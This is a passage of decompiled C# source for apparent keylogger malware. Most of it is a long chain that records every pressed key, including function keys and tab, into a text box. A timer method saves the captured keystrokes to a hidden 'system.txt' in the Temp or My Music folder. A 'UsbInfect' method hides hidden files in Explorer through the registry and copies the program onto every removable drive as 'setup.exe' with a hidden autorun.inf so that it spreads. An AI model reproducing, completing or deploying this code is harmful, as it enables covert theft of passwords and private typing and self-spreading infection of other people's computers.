			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		if (sent == 0)
		{
			Timer1.Stop();
			FileSystem.FileOpen(1, ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.txt", (OpenMode)4, (OpenAccess)(-1), (OpenShare)3, -1);
			FileSystem.FilePut(1, TextBox1.get_Text(), -1L, false);
			FileSystem.FileClose(new int[0]);
			FileSystem.SetAttr(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.txt", (FileAttribute)2);
			Timer1.Start();
		}
		if (sent == 1)
		{
			Timer1.Stop();
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + "\\system.txt", TextBox1.get_Text(), true);
			FileSystem.SetAttr(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + "\\system.txt", (FileAttribute)2);
			Timer1.Start();
		}
	}

	public void UsbInfect()
	{
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"0", RegistryValueKind.DWord);
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (!programFiles.Contains(text) && !((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text + "setup.exe"))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + "setup.exe", true);
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text + "autorun.inf", "[autorun]\r\nopen=" + text + "setup.exe\r\nshellexecute=" + text, true);
					FileSystem.SetAttr(text + "setup.exe", (FileAttribute)0);
					FileSystem.SetAttr(text + "autorun.inf", (FileAttribute)2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
